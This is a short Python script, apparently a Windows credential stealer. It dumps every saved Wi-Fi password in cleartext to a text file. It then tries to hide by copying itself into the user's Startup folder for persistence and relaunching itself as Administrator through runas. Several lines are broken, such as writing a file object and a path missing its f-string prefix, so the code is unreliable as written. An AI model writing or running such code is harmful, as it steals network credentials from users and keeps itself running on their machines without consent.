import os
import socket
import time
import shutil
import subprocess

# Waiting for the user to get connected to the internet for 20  seconds
time.sleep(2)

#Check the operating system
if os.name == 'nt':
    os.system('netsh wlan show profile * key=clear >> Windows.txt')
else:
    exit()

# Checking for internet connection
def internet():
    try:
        socket.gethostbyname('google.com')
        return True
    except socket.gaierror:
        return False
    except socket.getaddrinfo:
        return False   

if internet():
    pass

else:
    print('Nothing to see here')

# Checking the current user account
User = os.getlogin()

# Changing the directory
cd = os.chdir(f"c:/users/{User}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")

# Stay hidden
def hide():

    with open(__file__,'r') as Payload:
        Payload.read()

    with open('Asta.py','a') as  At:
        At.write(Payload)

    Asta = open('Asta.py', 'r')

    # Get the absolute path of the current script
    current_script_path = os.path.abspath(Asta)

    # Define the destination folder path
    destination_folder = 'c:/users/{User}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'

    # Move the script to the destination folder
    shutil.copy(current_script_path, os.path.join(destination_folder, os.path.basename(current_script_path)))

      # Run the script with administrative privileges
    runas_command = f'runas /user:Administrator "python {os.path.join(destination_folder, os.path.basename(current_script_path))}"'
    subprocess.run(runas_command, shell=True)


hide()